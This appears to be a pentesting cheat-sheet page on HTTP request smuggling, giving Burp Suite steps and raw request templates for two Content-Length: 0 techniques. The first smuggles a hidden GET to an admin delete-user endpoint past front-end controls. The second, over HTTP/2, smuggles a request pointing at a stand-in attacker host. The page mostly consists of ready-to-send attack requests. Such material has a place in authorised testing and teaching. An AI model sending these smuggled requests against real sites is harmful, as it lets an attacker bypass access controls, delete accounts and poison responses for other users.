---
title: HTTP Request Smuggling
desc: 
tags: [HTTP, Request, Smuggling, Web]
alts: []
render_with_liquid: false
---

## 1. Content-Length: 0

If the target website ignores the Content-Length, you’re able to access the restricted page by request smuggling.

1. **Prepare the Two Same Requests**

    If you're using Burp Suite, send the target request to **Repeater** twice.

2. **Change the First Request to POST Request**

3. **Set the "Content-Length: 0" in the First Request**

4. **Set the "Connection: keep-alive" in the First Request**

    Now two requests should look like:

    ```sh
    # Request 1
    POST / HTTP/1.1
    Host: example.com
    Cookie: key=value
    Connection: keep-alive
    Content-Length: 0

    GET /admin/delete?username=john
    Foo: x

    # -------------------------------------------------

    # Request 2
    GET / HTTP/1.1
    Host: example.com
    Cookie: key=value
    Connection: close
    ```

5. **Send Requests in Order**

    First off, if you're using Burp Suite, note that **enabling the "Update Content-Length" in the Burp Repeater option.**
    The sequence is Request 1 -> Request 2.

<br />

## 2. HTTP/2 Content-Length: 0

1. **Prepare Request**

    If you're using Burp Suite, note that **disable "Update Content-Length" and enable "Allow HTTP/2 ALPN override" in the Burp Repeater option.**

    The request shoud look like:

    ```sh
    POST / HTTP/2
    Host: example.com
    Content-Length: 0

    GET /exploit HTTP/1.1
    Host: attacker.com
    Content-Length: 5

    x=1
    ```

2. **Send Request**

    Before doing, don't forget to **expand the Inspector on the right in the Repeater and select "HTTP/2".**  
    Now send the request a few times.